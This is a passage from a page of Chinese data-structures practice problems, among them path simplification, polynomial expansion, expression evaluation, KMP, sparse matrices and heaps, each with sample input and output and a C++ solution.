.. 表示返回上一级目录，即返回根目录
.. 表示返回上一级目录，但当前目录为根目录，无上一级目录。故仍处于根目录。
bbb 表示进入根目录下 bbb 目录
ccc 表示进入 bbb 目录下 ccc 目录
.. 表示返回上一级目录，即返回 bbb 目录
后续若干个连续的斜杠 / 间没有目录名称，直接删除
. 表示当期文件夹，故仍处于 bbb 目录
.. 表示返回上一级目录，即返回根目录
根目录用斜杠 / 表示，故输出斜杠 /

# 样例输入输出
样例1
输入:
/aaa/../../bbb/ccc/..///./..
输出:
/

样例2
输入:
/home/
输出:
/home
</code></pre>
<p>Mind Palace: split inputted string, single stack.</p>
<pre><code class="language-c++">#include &lt;bits/stdc++.h&gt;

using namespace std;

class Solution {
public:
    static void run() {
        string cinStr; cin &gt;&gt; cinStr;
        // 1. Split input string with char '/'
        stringstream ss(cinStr);
        char separator = '/';
        string subString; vector&lt;string&gt; subStrings;
        while (getline(ss, subString, separator))
            if (!subString.empty()) subStrings.push_back(subString); // Ignore &quot;&quot; substring.

        // 2. Handle substrings with a stack;
        //    if substr is '..', pop; if substr is '.', do nothing; if substr is 'dir', push it.
        vector&lt;string&gt; sta; // Here use a vector to present stack.
        for (const auto&amp; str : subStrings) {
            if (str == &quot;..&quot; &amp;&amp; !sta.empty())
                sta.pop_back();
            else if (str == &quot;.&quot; || (str == &quot;..&quot; &amp;&amp; sta.empty()))
                continue;
            else
                sta.push_back(str);
        }
        // 3. Print out absolute linux address.
        cout &lt;&lt; &quot;/&quot;;
        for (auto i = sta.begin(); i != sta.end(); ++i) {
            cout &lt;&lt; *i;
            if (i != sta.end() - 1) cout &lt;&lt; &quot;/&quot;;
        }
    }
};

int main() {
    Solution::run();
    return 0;
}
</code></pre>
<h1 id="二元一次多项式求幂">二元一次多项式求幂</h1>
<pre><code class="language-Markdown"># 题目描述
给定一个常数项为0的二元一次多项式，求该多项式的幂。
设未知数为x,y，输入为x和y的整数系数a,b以及整数幂n，输出形如以下样式
求幂运算的结果，按照x的幂降序排列

# Input Format
输入未知数整数系数 a,b (-100&lt;a,b&lt;100),n (1&lt;n&lt;6)
# Output Format
幂运算的结果的多项式，按照x幂降序排列  

# Example
Input
 2 3 2
Output
4x^2+12xy+9y^2

# 说明
幂为1时不输出^1
系数为1时不输出系数，-1只输出负号。

# 样例输入输出
样例1
输入:
2 3 2
输出:
4x^2+12xy+9y^2
</code></pre>
<p>Mind Palace: queue.</p>
<pre><code class="language-c++">#include &lt;bits/stdc++.h&gt;

using namespace std;

class Solution {
public:
    static void run() {
        int a, b, n; cin &gt;&gt; a &gt;&gt; b &gt;&gt; n;
        queue&lt;long&gt; que;
        que.push(0); que.push(a); que.push(b);
        long first = que.front(); que.pop();
        long second = 0;
        long tmp = 0;
        for (int i = 0; i &lt; n - 1; ++i) {
            que.push(0);
            for (int j = 0; j &lt; i + 3; ++j) {
                second = que.front(); que.pop();
                tmp = first * b + second * a;
                que.push(tmp);
                first = second;
            }
        }

        int power = n; // Power of x; Power of y is n - power.
        while (!que.empty()) {
            // Print sign symbol.
            if (power != n &amp;&amp; que.front() &gt; 0) cout &lt;&lt; &quot;+&quot;;
            // Print the coefficient.
            if (que.front() == 1) {
                cout &lt;&lt; &quot;&quot;;
                que.pop();
            } else if (que.front() == -1) {
                cout &lt;&lt; &quot;-&quot;;
                que.pop();
            } else {
                cout &lt;&lt; que.front();
                que.pop();
            }
            // Print x and y.
            if (power != 0) cout &lt;&lt; &quot;x&quot;;
            if (power &gt;  1) cout &lt;&lt; &quot;^&quot; &lt;&lt; power;
            if (n - power != 0) cout &lt;&lt; &quot;y&quot;;
            if (n - power &gt;  1) cout &lt;&lt; &quot;^&quot; &lt;&lt; n - power;
            power--;
        }

    }
};

int main() {
    Solution::run();
    return 0;
}
</code></pre>
<h1 id="二元一次多项式的幂大整数">二元一次多项式的幂（大整数）</h1>
<pre><code class="language-Markdown"># 题目描述
给定一个常数项为0的二元一次多项式，求该多项式的幂。
设未知数为x,y，输入为x和y的整数系数a,b以及整数幂n，输出形如以下样式
求幂运算的结果，按照x的幂降序排列

Input Format
输入未知数整数系数 a,b (-1000&lt;a,b&lt;1000),n (2&lt;n&lt;20)
Output Format
幂运算的结果的多项式，按照x幂降序排列  

# Example
Input
99 100 15  
Output
860058354641288524893953951499x^15+13031187191534674619605362901500x^14y+92139707414891638724482363950000x^13y^2+403305116630838822699754455000000x^12y^3+1222136717063147947575013500000000x^11y^4+2715859371251439883500030000000000x^10y^5+4572153823655622699495000000000000x^9y^6+5937862108643665843500000000000000x^8y^7+5997840513781480650000000000000000x^7y^8+4712108147752005000000000000000000x^6y^9+2855823119849700000000000000000000x^5y^10+1311213553650000000000000000000000x^4y^11+441486045000000000000000000000000x^3y^12+102910500000000000000000000000000x^2y^13+14850000000000000000000000000000xy^14+1000000000000000000000000000000y^15

# 说明
幂为1时不输出^1
系数为1时不输出系数，-1只输出负号。

# 样例输入输出
样例1
输入:
99 100 15
输出:
860058354641288524893953951499x^15+13031187191534674619605362901500x^14y+92139707414891638724482363950000x^13y^2+403305116630838822699754455000000x^12y^3+1222136717063147947575013500000000x^11y^4+2715859371251439883500030000000000x^10y^5+4572153823655622699495000000000000x^9y^6+5937862108643665843500000000000000x^8y^7+5997840513781480650000000000000000x^7y^8+4712108147752005000000000000000000x^6y^9+2855823119849700000000000000000000x^5y^10+1311213553650000000000000000000000x^4y^11+441486045000000000000000000000000x^3y^12+102910500000000000000000000000000x^2y^13+14850000000000000000000000000000xy^14+1000000000000000000000000000000y^15
</code></pre>
<p>Mind Palace: using string to represent big number, queue.</p>
<pre><code class="language-c++">#include &lt;bits/stdc++.h&gt;

using namespace std;

class Solution {
public:
    // multiplyStr handles the sign bit.
    static string multiplyStr(string a, string b) {
        string ret;
        // Handle the sign bit.
        if (a[0] == '-' &amp;&amp; b[0] == '-') { a.erase(0, 1); b.erase(0, 1); }
        if (a[0] == '-' &amp;&amp; b[0] != '-') { a.erase(0, 1); ret = &quot;-&quot;; }
        if (a[0] != '-' &amp;&amp; b[0] == '-') { b.erase(0, 1); ret = &quot;-&quot;; }
        reverse(a.begin(), a.end());
        reverse(b.begin(), b.end());

        vector&lt;int&gt; res = vector&lt;int&gt;(a.size() + b.size());
        for (int i = 0; i &lt; a.size(); ++i) {
            for (int j = 0; j &lt; b.size(); ++j) {
                res[i + j] += (a[i] - '0') * (b[j] - '0');
            }
        }
        int carry = 0;
        for (int &amp; n : res) {
            int newCarry = (n + carry) / 10;
            n = (n + carry) % 10;
            carry = newCarry;
        }
        if (res.back() == 0) res.pop_back();
        for (auto i = res.rbegin(); i != res.rend(); ++i)
            ret += to_string(*i);
        return ret;
    }

    // addStr only deals with positive a plus positive b.
    static string addStr(string a, string b) {
        reverse(a.begin(), a.end());
        reverse(b.begin(), b.end());
        vector&lt;int&gt; res = vector&lt;int&gt;(max(a.size(), b.size()) + 1);
        string ret;
        for (int i = 0; i &lt; min(a.size(), b.size()); ++i)
            res[i] = (a[i] - '0') + (b[i] - '0');
        for (int i = static_cast&lt;int&gt;(min(a.size(), b.size())); i &lt; a.size(); ++i)
            res[i] = a[i] - '0';
        for (int i = static_cast&lt;int&gt;(min(a.size(), b.size())); i &lt; b.size(); ++i)
            res[i] = b[i] - '0';
        int carry = 0;
        for (int &amp; n : res) {
            int newCarry = (n + carry) / 10;
            n = (n + carry) % 10;
            carry = newCarry;
        }
        if (res.back() == 0) res.pop_back();
        for (auto i = res.rbegin(); i != res.rend(); ++i)
            ret += to_string(*i);
        return ret;
    }

    // subtractStr only deals with positive a minus positive b and a &gt;= b.
    static string subtractStr(string a, string b) {
        reverse(a.begin(), a.end());
        reverse(b.begin(), b.end());
        vector&lt;int&gt; res = vector&lt;int&gt;(a.size());
        string ret;
        int borrow = 0;
        for (int i = 0; i &lt; b.size(); ++i) {
            int tmp = (a[i] - '0') - (b[i] - '0') - borrow;
            if (tmp &gt;= 0) { res[i] = tmp; borrow = 0; }
            else { res[i] = tmp + 10; borrow = 1; }
        }
        for (int i = static_cast&lt;int&gt;(b.size()); i &lt; a.size(); ++i) {
            int tmp = (a[i] - '0') - borrow;
            if (tmp &gt;= 0) { res[i] = tmp; borrow = 0; }
            else { res[i] = tmp + 10; borrow = 1; }
        }
        if (res.back() == 0) res.pop_back();
        for (auto i = res.rbegin(); i != res.rend(); ++i)
            ret += to_string(*i);
        return ret;
    }

    // Judge a and b which one is bigger, with no sign bit.
    // If a &gt;= b, return true.
    // If a &lt;  b, return false.
    static bool judgeStr(const string&amp; a, const string&amp; b) {
        if (a.size() &gt; b.size()) return true;
        if (a.size() == b.size()) return a &gt;= b;
        return false;
    }

    static void run() {
        int a, b, n; cin &gt;&gt; a &gt;&gt; b &gt;&gt; n;
        queue&lt;string&gt; que;
        que.push(&quot;0&quot;); que.push(to_string(a)); que.push(to_string(b));
        string first = que.front(); que.pop();
        string second = &quot;0&quot;;
        string num1, num2, tmp;
        for (int i = 0; i &lt; n - 1; ++i) {
            que.push(&quot;0&quot;);
            for (int j = 0; j &lt; i + 3; ++j) {
                second = que.front(); que.pop();
                // String multiplication, addition, subtraction.
                // tmp = first * b + second * a;
                num1 = multiplyStr(first, to_string(b));
                num2 = multiplyStr(second, to_string(a));

                if (num1[0] != '-' &amp;&amp; num2[0] != '-')
                    tmp = addStr(num1, num2);
                if (num1[0] == '-' &amp;&amp; num2[0] == '-')
                    tmp = &quot;-&quot; + addStr(num1.erase(0, 1), num2.erase(0, 1));
                if (num1[0] != '-' &amp;&amp; num2[0] == '-') {
                    if (judgeStr(num1, num2.erase(0, 1)))
                        tmp = subtractStr(num1, num2);
                    else
                        tmp = &quot;-&quot; + subtractStr(num2, num1);
                }
                if (num1[0] == '-' &amp;&amp; num2[0] != '-') {
                    if (judgeStr(num1.erase(0, 1), num2))
                        tmp = &quot;-&quot; + subtractStr(num1, num2);
                    else
                        tmp = subtractStr(num2, num1);
                }

                que.push(tmp);
                first = second;
            }
        }

        int power = n; // Power of x; Power of y is n - power.
        while (!que.empty()) {
            // Print sign symbol.
            if (power != n &amp;&amp; que.front() &gt; &quot;0&quot;) cout &lt;&lt; &quot;+&quot;;
            // Print the coefficient.
            if (que.front() == &quot;1&quot;) {
                cout &lt;&lt; &quot;&quot;;
                que.pop();
            } else if (que.front() == &quot;-1&quot;) {
                cout &lt;&lt; &quot;-&quot;;
                que.pop();
            } else {
                cout &lt;&lt; que.front();
                que.pop();
            }
            // Print x and y.
            if (power != 0) cout &lt;&lt; &quot;x&quot;;
            if (power &gt;  1) cout &lt;&lt; &quot;^&quot; &lt;&lt; power;
            if (n - power != 0) cout &lt;&lt; &quot;y&quot;;
            if (n - power &gt;  1) cout &lt;&lt; &quot;^&quot; &lt;&lt; n - power;
            power--;
        }

    }
};

int main() {
    Solution::run();
    return 0;
}
</code></pre>
<h1 id="表达式求值">表达式求值</h1>
<pre><code class="language-Markdown"># 题目描述
设计一个表达式求值的程序。该程序必须可以接受包含（，），+，-，*，/，%和^(求幂)的中缀表达式，并求出结果。如果表达式正确，则输出表达式的值，如果表达式非法，则输出错误信息。
注意2^2^3转为后缀应为223^^

操作数均转为double运算。
幂运算可以直接使用pow(a,b)
%,操作数转为Int再进行计算。

输入要求：
多个表达式，每个表达式占一行。
输出要求：
对每个表达式，如果为正确表达式则输出结果（精确到小数点后两位），如果为错误表达式则输出“ERROR IN INFIX NOTATION”.

# 样例输入输出
样例1
输入:
(2-4)^3
输出:
-8.00
样例2
输入:
(3*5*(4+8)%2)
输出:
0.00
样例3
输入:
1+2(
输出:
ERROR IN INFIX NOTATION
</code></pre>
<p>Mind Palace: two stacks and proper calculation rules.</p>
<pre><code class="language-c++">#include &lt;bits/stdc++.h&gt;

using namespace std;

class Solution {
private:
    // Operator priority map.
    const map&lt;char, int8_t&gt; priority = {
            {'+', 0}, {'-', 0},
            {'*', 1}, {'/', 1}, {'%', 1},
            {'^', 2},
            {'#', 3}
    };
    bool wrongExp = false;
public:
    double calcu(double&amp; a, double&amp; b, char&amp; op) {
        double ans;
        switch (op) {
            case '+':
                ans = a + b;
                break;
            case '-':
                ans = a - b;
                break;
            case '*':
                ans = a * b;
                break;
            case '/':
                if (b != 0.0) ans = a / b;
                else this-&gt;wrongExp = true;
                break;
            case '%':
                if (b != 0.0) ans = fmod(a, b);
                else this-&gt;wrongExp = true;
                break;
            case '^':
                ans = pow(a, b);
                break;
            default:
                this-&gt;wrongExp = true;
        }
        return ans;
    }

    void oneProcess(vector&lt;char&gt;&amp; operators, vector&lt;double&gt;&amp; operands) {
        if (operators.back() == '#') {
            double a;
            if (!operands.empty()) { a = operands.back(); operands.pop_back(); }
            else this-&gt;wrongExp = true;
            operands.push_back(-a);
            return;
        }
        double a, b, tmp;
        // Exp: a `operator` b.
        if (!operands.empty()) { b = operands.back(); operands.pop_back(); }
        else this-&gt;wrongExp = true;
        if (!operands.empty()) { a = operands.back(); operands.pop_back(); }
        else this-&gt;wrongExp = true;
        if (!operators.empty()) {
            char op = operators.back();
            operators.pop_back();
            tmp = this-&gt;calcu(a, b, op);
        } else this-&gt;wrongExp = true;
        if (!this-&gt;wrongExp) operands.push_back(tmp);
    }

    // Traverse the whole string and change '-' which represents negative sign into '#'.
    static void preprocess(string&amp; exp) {
        for (int i = 0; i &lt; exp.size(); ++i) {
            if (exp[i] == '-' &amp;&amp; (i != 0 &amp;&amp; (exp[i-1] == ')' || (exp[i-1] &gt;= '0' &amp;&amp; exp[i-1] &lt;= '9'))) )
                continue;
            else if (exp[i] == '-')
                exp.replace(i, 1, &quot;#&quot;);
        }
    }

    void run() {
        string exp; cin &gt;&gt; exp;
        Solution::preprocess(exp);
        vector&lt;char&gt; operators; vector&lt;double&gt; operands; // Use vector to represent stack.
        for (int i = 0; i &lt; exp.size(); ) {
            // Handle the chars which belong to operators.
            if (exp[i] == '(') { operators.push_back(exp[i]); ++i; continue; }
            if (this-&gt;priority.find(exp[i]) != this-&gt;priority.end()) {
                if (operators.empty()) {
                    operators.push_back(exp[i]);
                    ++i; continue;
                }
                // When op exp[i] is prioritized than the front of stack, push exp[i] into stack.
                if (!operators.empty()
                    &amp;&amp; (this-&gt;priority.find(operators.back())-&gt;second &lt; this-&gt;priority.find(exp[i])-&gt;second
                        || operators.back() == '(')) {
                    operators.push_back(exp[i]);
                    ++i; continue;
                }
                // When op exp[i] is lowerly or equally prioritized than the front of stack;
                // pop one operator and two operands, calculate subexp, push operand into operands stack,
                // until op exp[i] is prioritized than the front of stack or operators stack is empty.
                while (!operators.empty()
                    &amp;&amp; this-&gt;priority.find(operators.back())-&gt;second &gt;= this-&gt;priority.find(exp[i])-&gt;second) {
                    oneProcess(operators, operands);
                    if (this-&gt;wrongExp) { cout &lt;&lt; &quot;ERROR IN INFIX NOTATION&quot;; return; }
                }
                operators.push_back(exp[i]);
                ++i; continue;

            }
            if (exp[i] == ')') {
                while (operators.back() != '(') {
                    oneProcess(operators, operands);
                    if (this-&gt;wrongExp) { cout &lt;&lt; &quot;ERROR IN INFIX NOTATION&quot;; return; }
                }
                operators.pop_back(); // Pop '(' from stack.
                ++i; continue;
            }

            // Handle the chars which belong to operands.
            string num;
            double operand;
            while ((exp[i] &gt;= '0' &amp;&amp; exp[i] &lt;= '9') || exp[i] == '.') {
                num += exp[i];
                ++i;
            }
            operand = stod(num);
            operands.push_back(operand);
        }
        // After traversing the whole exp string, then handle the left ops inside operators stack.
        while (!operators.empty()) {
            oneProcess(operators, operands);
            if (this-&gt;wrongExp) { cout &lt;&lt; &quot;ERROR IN INFIX NOTATION&quot;; return; }
        }
        if (operands.size() != 1) { cout &lt;&lt; &quot;ERROR IN INFIX NOTATION&quot;; return; }
        // Print out result. (Q: c++ cout precision 2)
        // cout &lt;&lt; setprecision(2) &lt;&lt; operands.back();
        printf(&quot;%.2lf&quot;, operands.back());
    }
};

int main() {
    Solution().run();
    return 0;
}
</code></pre>
<h1 id="根据next数组推导模式字符串">根据next数组推导模式字符串</h1>
<pre><code class="language-Markdown"># 题目描述
根据KMP算法的next数组值，推断模式字符串。
假设模式字符串中只存在0，1两种字符。给出首字符和next数组。请输出模式字符串。如果next数组不合法则输出ERROR

Input Format
先输入模式字符串首字符0或者1，然后输入尾字符0或者1
再输入 模式字符串长度n，n&lt;=30
最后输入n个以 -1，0，起始的整数。

Output Format
模式字符串 或者 ERROR 

# Example
Input
1 0 10
-1 0 1 2 3 4 0 1 2 3
Output
1111101110

Input
1 1 6
-1 0 0 0 0 0
Output
100001

Input
1 1 6
-1 0 2 0 0 0
Output
ERROR

说明
以传统未优化的KMP算法推导的next数组。

# 样例输入输出
样例1
输入:
1 1 6
-1 0 0 0 0 0
输出:
100001

样例2
输入:
1 1 6
-1 0 2 0 0 0
输出:
ERROR

样例3
输入:
1 1 7
-1 0 1 2 3 4 2
输出:
ERROR
</code></pre>
<p>Mind Palace: next list in kmp.</p>
<pre><code class="language-python">#include &lt;bits/stdc++.h&gt;

using namespace std;

class Solution {
public:
    static void run() {
        int front, back, n; cin &gt;&gt; front &gt;&gt; back &gt;&gt; n;
        vector&lt;int&gt; next(n), res(n);
        for (int i = 0; i &lt; n; ++i)
            cin &gt;&gt; next[i];

        int curr;
        res[0] = front;
        for (int i = 2; i &lt; n; ++i) {
            if (next[i] == 0) {
                if (front == 1) curr = 0;
                else curr = 1;
            } else {
                if (next[i] &gt;= i || (i != next[i] + 1 &amp;&amp; res[i - next[i] - 1] == res[0]))
                    { cout &lt;&lt; &quot;ERROR&quot; &lt;&lt; endl; return; }
                else
                    { curr = res[next[i] - 1]; }
            }
            res[i- 1] = curr;
        }
        for (int i = 0; i &lt; n - 1; ++i)
            cout &lt;&lt; res[i];
        cout &lt;&lt; back &lt;&lt; endl;
    }
};

int main() {
    Solution::run();
    return 0;
}
</code></pre>
<h1 id="三元组表示的稀疏矩阵的乘法运算">三元组表示的稀疏矩阵的乘法运算</h1>
<pre><code class="language-Markdown"># 题目描述
对两个由三元组表示的稀疏矩阵进行乘法运算

输入：
第一行为三个整数row，column，count，用空格分隔，分别表示稀疏矩阵的行数、列数、非零元素的个数。
第二行开始输入该稀疏矩阵的三元组，每行三个整数，空格分隔，分别代表一个非零元素的行标、列标、值，共输入count行。
空一行后开始输入第二个稀疏矩阵的row，column，count，及三元组。
输出：
如果计算结果为零矩阵，输出“The answer is a Zero Matrix”,如果结果为非零矩阵，输出结果的三元组表示，要求输出三元组有序,行尾无空格。如果无法计算矩阵乘法，输出“ERROR”。

# 样例输入输出
样例1
输入:
2 2 2
1 1 1
2 2 1

2 2 2
1 2 2
2 1 2
输出:
1 2 2
2 1 2
样例2
输入:
2 2 1
1 1 5

2 2 1
2 2 -5
输出:
The answer is a Zero Matrix
样例3
输入:
3 3 3
1 3 1
2 1 1
3 2 1

2 2 3
1 2 1
2 1 1
2 2 1
输出:
ERROR
</code></pre>
<p>Mind Palace: loop and sort.</p>
<pre><code class="language-python">#include &lt;bits/stdc++.h&gt;

using namespace std;

class Solution {
public:
    static bool cmp(const vector&lt;int&gt;&amp; a, const vector&lt;int&gt;&amp; b) {
        if (a[0] &lt;= b[0] &amp;&amp; a[1] &lt; b[1]) return true;
        return false;
    }

    static void run() {
        int row1, col1, n1, row2, col2, n2;
        vector&lt;vector&lt;int&gt;&gt; m1, m2, res;
        cin &gt;&gt; row1 &gt;&gt; col1 &gt;&gt; n1;  // Init matrix1.
        for (int i = 0; i &lt; n1; ++i) {
            int a, b, c; cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;
            m1.push_back({ a, b, c});
        }
        cin &gt;&gt; row2 &gt;&gt; col2 &gt;&gt; n2;  // Init matrix2.
        for (int i = 0; i &lt; n2; ++i) {
            int a, b, c; cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;
            m2.push_back({ a, b, c});
        }
        if (col1 != row2)
            { cout &lt;&lt; &quot;ERROR&quot; &lt;&lt; endl; return; }

        for (int i = 0; i &lt; n1; ++i) {
            for (int j = 0; j &lt; n2; ++j) {
                if (m1[i][1] == m2[j][0]) {
                    int flag = 0;
                    // If res has this element, add them together.
                    for (auto &amp; re : res) {
                        if (re[0] == m1[i][0] &amp;&amp; re[1] == m2[j][1])
                            { re[2] += m1[i][2] * m2[j][2]; flag = 1; break; }
                    }
                    // If not, push a new vector.
                    if (flag == 0) res.push_back({m1[i][0], m2[j][1], m1[i][2] * m2[j][2]});
                }
            }
        }

        if (res.empty()) { cout &lt;&lt; &quot;The answer is a Zero Matrix&quot; &lt;&lt; endl; return; }
        std::sort(res.begin(), res.end(), cmp);  // Sort the matrix before printing.
        for (const auto &amp; re : res) {
            cout &lt;&lt; re[0] &lt;&lt; &quot; &quot; &lt;&lt; re[1] &lt;&lt; &quot; &quot; &lt;&lt; re[2] &lt;&lt; endl;
        }
    }
};

int main() {
    Solution::run();
    return 0;
}
</code></pre>
<h1 id="求整数最大间隔-性能">求整数最大间隔-性能</h1>
<pre><code class="language-Markdown"># 题目描述
请输出数字序列的最大间隔。

请使用以下伪随机数生成函数 rand32 () 生成伪随机数

int  seed  ;
int rand(){ return((( seed   =  seed   * 214013L + 2531011L) &gt;&gt; 16) &amp; 0x7fff); }
int rand32(){
return ((rand() &lt;&lt; 16) + (rand() &lt;&lt; 1) + rand() % 2);
}

## Input Format

2个整数，n seed 其中 2&lt;n&lt;=20000000，seed为随机数种子。

## Output Format
整数序列的最大间隔

## Example
Input
2000000
1

Output
15737

注意：O(nlogn)以上的时间复杂度至少会有一个案例超时。

# 样例输入输出
样例1
输入:
1959000 4910
输出:
16709
</code></pre>
<p>Mind Palace: hash table.</p>
<pre><code class="language-c++">#include &lt;bits/stdc++.h&gt;

using namespace std;

class Solution {
private:
    int n;
    int seed;

private:
    int randI() {
        return ((( seed = seed * 214013L + 2531011L) &gt;&gt; 16) &amp; 0x7fff);
    }

    int rand32() {
        return ((randI() &lt;&lt; 16) + (randI() &lt;&lt; 1) + randI() % 2);
    }

    int maxGap(vector&lt;int&gt; &amp; vec) {
        int minNum = vec[0], maxNum = vec[0];
        for (const auto &amp; ele : vec) {
            if (ele &lt; minNum) minNum = ele;
            if (ele &gt; maxNum) maxNum = ele;
        }
        if (minNum == maxNum) return 0;

        vector&lt;bool&gt; hasNum(n + 1);
        vector&lt;int&gt; mins(n + 1); vector&lt;int&gt; maxs(n + 1);
        for (int i = 0; i &lt; n; i++) {
            double gap = (static_cast&lt;double &gt;(maxNum) - static_cast&lt;double &gt;(minNum)) / (n - 1);
            int index = static_cast&lt;int&gt;((vec[i] - minNum) / gap);
            if (hasNum[index]) {
                mins[index] = min(vec[i], mins[index]);
                maxs[index] = max(vec[i], maxs[index]);
            } else {
                mins[index] = maxs[index] = vec[i];
                hasNum[index] = true;
            };
        }

        int maxGap = 0;
        int lastMax = maxs[0];
        for (int i = 0; i &lt; n + 1; i++) {
            if (hasNum[i]) {
                maxGap = max(maxGap, (mins[i] - lastMax));
                lastMax = maxs[i];
            }
        }
        return maxGap;
    }

public:
    void run() {
        cin &gt;&gt; n &gt;&gt; seed;
        vector&lt;int&gt; vec(n);
        for (int i = 0; i &lt; n; i++)
            vec[i] = rand32();
        cout &lt;&lt; maxGap(vec) &lt;&lt; endl;
    }
};

int main () {
    Solution().run();
    return 0;
}
</code></pre>
<h1 id="完全二叉树的先序遍历">完全二叉树的先序遍历</h1>
<pre><code class="language-Markdown"># 题目描述
给出一棵完全二叉树的先序遍历，输出其后序遍历。结点均为不重复的单个英文字母，区分大小写。结点总数小于52。

Input Format

输入先序字符串

Output Format
后序遍历字符串

Example
Input
ABDGHCEIF

Output
GHDCBIFEA

# 样例输入输出
样例1
输入:
ABDGHCEIF
输出:
GHDCBIFEA
样例2
输入:
a
输出:
a
</code></pre>
<pre><code class="language-c++">#include &lt;bits/stdc++.h&gt;

using namespace std;

class Solution {
private:
    string preOrder;
    unsigned long n = 0;
    unsigned long index = 0;
    vector&lt;char&gt; levelOrder;

    void getLevel(int x) {
        if (x &gt; n) return;
        levelOrder[x] = preOrder[index++];
        getLevel(x * 2);
        getLevel(x * 2 + 1);
    }

    void getPost(int x) {
        if (x &gt; n) return;
        getPost(x * 2);
        getPost(x * 2 + 1);
        cout &lt;&lt; levelOrder[x];
    }

public:
    void Run() {
        cin &gt;&gt; preOrder;
        n = preOrder.size();
        levelOrder = vector&lt;char&gt;(n + 1);

        index = 0;
        getLevel(1);
        getPost(1);
    }
};

int main () {
    Solution().Run();
    return 0;
}
</code></pre>
<h1 id="二叉树遍历及二叉树高度">二叉树遍历及二叉树高度</h1>
<pre><code class="language-Markdown"># 题目描述
给出一棵二叉树的先序遍历和中序遍历序列，计算该二叉树的高度。其中，二叉树的先序和中序遍历序列为不包含重复英文字母（区别大小写）的字符串。

Input Format
二叉树结点的总个数n&lt;=50
然后输入先序和中序遍历序列，两个序列长度均为n。  

Output Format
二叉树高度（整数） ，叶子结点高度为1 

Example
Input
9
ABDGHCEIF
GDHBAEICF

Output
4

# 样例输入输出
样例1
输入:
9
ABDGHCEIF
GDHBAEICF
输出:
4
</code></pre>
<p>Mind Palace: recursion.</p>
<pre><code class="language-c++">#include &lt;bits/stdc++.h&gt;

using namespace std;

class Solution {
private:
    vector&lt;char&gt; preOrder;
    vector&lt;char&gt; inOrder;
public:
    int getHeight(int preFirst, int inFirst, int len) {
        if (len == 0) return 0;
        int delim = inFirst;
        // Find the root node of current tree.
        for (int i = 0; i &lt; len; i++) {
            if (inOrder[inFirst + i] == preOrder[preFirst])
                { delim = i; break; }
        }
        // Recursively get the max height from left and right subtrees.
        int leftH = getHeight(preFirst+1, inFirst, delim);
        int rightH = getHeight(preFirst+delim+1, inFirst+delim+1, len-delim-1);
        return max(leftH, rightH) + 1;
    }
    void run() {
        int nodeNum; cin &gt;&gt; nodeNum;
        preOrder = vector&lt;char&gt;(nodeNum);
        inOrder = vector&lt;char&gt;(nodeNum);
        for (int i = 0; i &lt; nodeNum; i++)
            cin &gt;&gt; preOrder[i];
        for (int i = 0; i &lt; nodeNum; i++)
            cin &gt;&gt; inOrder[i];
        cout &lt;&lt; getHeight(0, 0, nodeNum) &lt;&lt; endl;
    }
};

int main() {
    Solution().run();
    return 0;
}
</code></pre>
<h1 id="判断是否为堆-堆整理">判断是否为堆-堆整理</h1>
<pre><code class="language-Markdown"># 题目描述
请判断输入的整数序列是否为堆。
如果为最大堆，请输出“max ”以及整理后的最小堆，整数序列数字之间有空格，最后无空格。
如果为最小堆，请输出“min ” 以及整理后的最大堆，整数序列数字之间有空格，最后无空格。
如果不为堆，请输出整理后的最大堆，整数序列数字之间有空格，最后无空格。
如果既是最大堆也是最小堆，请只输出“max min ”

## Input Format
先输入整数序列个数n 0&lt;n&lt;1000
然后输入n个整数序列，整数取值范围【-100000，100000】
## Output Format
最大堆或最小堆序列

## Example
Input
10
-8 8 -9 10 -2 1 -6 -9 7 2 
Output
10 8 1 7 2 -9 -6 -9 -8 -2

Input
10
10 8 1 7 2 -9 -6 -9 -8 -2
Output
max -9 -9 -6 -8 -2 1 10 7 8 2

Input
 10
-9 -9 -6 -8 -2 1 10 7 8 2
Output
min 10 8 1 7 2 -9 -6 -9 -8 -2

Input
 3
1 1 1
Output
max min 

注意：序列最后无空格,max和min后面均有空格。
如案例，定义以下实现约束：两个相等子节点情况下，整理过程中，父节点下沉时，选择右沉。

10

10 8 1 7 2 -9 -6 -9 -8 -2
 两个相等子节点情况下，整理过程中，父节点下沉时，选择右沉。

# 样例输入输出
## 样例1
输入:
10
-9 -9 -6 -8 -2 1 10 7 8 2
输出:
min 10 8 1 7 2 -9 -6 -9 -8 -2
## 样例2
输入:
3
1 1 1
输出:
max min 
## 样例3
输入:
10
10 8 1 7 2 -9 -6 -9 -8 -2
输出:
max -9 -9 -6 -8 -2 1 10 7 8 2
## 样例4
输入:
10
-8 8 -9 10 -2 1 -6 -9 7 2 
输出:
10 8 1 7 2 -9 -6 -9 -8 -2
</code></pre>
<p>Mind Palace:<br>
这道题的坑点在 最小堆的调整上 当两个子结点的数值相同时，(题目给出的答案是)根节点与右子结点交换</p>
<pre><code class="language-c++">#include &lt;bits/stdc++.h&gt;

using namespace std;

class Solution {
private:
    vector&lt;int&gt; arr;
    int arrLen = 0;
    bool isMinHeap = true;
    bool isMaxHeap = true;

public:
    // Check whether arr is a min heap.
    void checkMinHeap(int root) {
        if (root * 2 + 1 &lt; arr.size() &amp;&amp; arr[root] &gt; arr[root * 2 + 1]) { isMinHeap = false; return; }
        if (root * 2 + 2 &lt; arr.size() &amp;&amp; arr[root] &gt; arr[root * 2 + 2]) { isMinHeap = false; return; }
        if (isMinHeap &amp;&amp; root * 2 + 1 &lt; arr.size()) checkMinHeap(root * 2 + 1);
        else return;
        if (isMinHeap &amp;&amp; root * 2 + 2 &lt; arr.size()) checkMinHeap(root * 2 + 2);
        else return;
    }

    // Check whether arr is a max heap.
    void checkMaxHeap(int root) {
        if (root * 2 + 1 &lt; arr.size() &amp;&amp; arr[root] &lt; arr[root * 2 + 1]) { isMaxHeap = false; return; }
        if (root * 2 + 2 &lt; arr.size() &amp;&amp; arr[root] &lt; arr[root * 2 + 2]) { isMaxHeap = false; return; }
        if (isMaxHeap &amp;&amp; root * 2 + 1 &lt; arr.size()) checkMaxHeap(root * 2 + 1);
        else return;
        if (isMaxHeap &amp;&amp; root * 2 + 2 &lt; arr.size()) checkMaxHeap(root * 2 + 2);
        else return;
    }

    void printArr() {
        for (auto i = arr.begin(); i != arr.end(); i++) {
            cout &lt;&lt; *i;
            if (i != arr.end() - 1) cout &lt;&lt; &quot; &quot;;
        }
        cout &lt;&lt; endl;
    }

    // Adjust max heap.
    void adjustMaxHeap(int ind) {
